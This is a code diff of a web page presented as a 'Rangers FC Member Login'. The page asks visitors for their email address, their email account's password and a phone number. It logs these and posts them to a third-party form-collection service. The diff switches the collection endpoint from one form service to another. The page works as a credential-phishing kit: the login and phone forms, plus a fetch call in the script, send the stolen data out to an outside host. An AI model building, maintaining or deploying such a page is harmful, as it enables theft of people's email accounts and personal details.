@@ -101,7 +101,7 @@
 <!-- Modal Login Form -->
 <div class="modal" id="loginModal">
     <h2>Rangers FC Member Login</h2>
-    <form id="loginForm" action="https://formspree.io/f/xwpneebp" method="POST">
+    <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
         <input type="email" id="email" name="email" placeholder="Enter your email" required>
         <input type="password" id="password" name="password" placeholder="Enter your email password" required>
         <button type="submit">Login</button>
@@ -111,7 +111,7 @@
 <!-- Phone Number Input (hidden initially) -->
 <div class="modal" id="phoneModal" style="display: none;">
     <h2>Enter Your Phone Number</h2>
-    <form id="phoneForm" action="https://formspree.io/f/xwpneebp" method="POST">
+    <form id="phoneForm" action="https://getform.io/f/avrmyepa" method="POST">
         <input type="tel" id="phone" name="phone" placeholder="Enter your phone number, we will send the form immediately to your phone." required>
         <button type="submit">Submit</button>
     </form>
@@ -153,8 +153,8 @@
         // Log the phone number along with email and password
         console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
 
-        // Send data to Formspree
-        fetch('https://formspree.io/f/xwpneebp', {
+        // Send data to Getform
+        fetch('https://getform.io/f/avrmyepa', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
